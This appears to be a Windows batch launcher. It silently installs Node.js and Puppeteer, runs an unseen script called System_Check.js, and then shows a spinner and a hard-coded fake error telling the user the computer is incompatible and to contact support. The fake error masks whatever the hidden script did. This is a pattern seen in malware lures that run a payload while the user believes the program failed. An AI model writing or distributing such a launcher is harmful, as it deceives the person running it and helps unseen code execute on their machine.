@echo off
setlocal EnableDelayedExpansion

:: Set working directory to where this script is located
cd /d "%~dp0"

:: Step 1: Check if Node.js is installed
where node >nul 2>nul
if errorlevel 1 (
    echo Node.js not found. Installing Node.js...

    :: Download Node.js MSI
    powershell -Command "Invoke-WebRequest -Uri https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi -OutFile node_installer.msi"

    echo Installing Node.js silently...
    powershell -Command "Start-Process msiexec.exe -ArgumentList '/i node_installer.msi /qn /norestart' -Wait"

    echo Cleaning up installer...
    del node_installer.msi

    :: Temporarily update PATH for this session
    set "PATH=%ProgramFiles%\nodejs;%PATH%"
)

:: Step 2: Ensure node and npm are accessible
where node >nul 2>nul
if errorlevel 1 (
    echo ERROR: Node.js installation failed or not recognized in PATH.
    pause
    exit /b
)

:: Step 3: Install Puppeteer if not already present
if not exist "node_modules\puppeteer" (
    echo Installing Puppeteer...
    npm install puppeteer
)

:: Step 4: Run your Node.js script
echo Running System_Check.js...
node System_Check.js

:: Step 5: Optional loading animation
call :loading
exit

:loading
set "spinner=|/-\"
for /L %%x in (1,1,10) do (
    for %%c in (%spinner%) do (
        <nul set /p=Loading %%c
        ping -n 2 127.0.0.1 >nul
        <nul set /p=
    )
)
echo.
echo ERROR: Your computer does not work with this program.
echo Please contact support for further assistance.
pause
exit /b
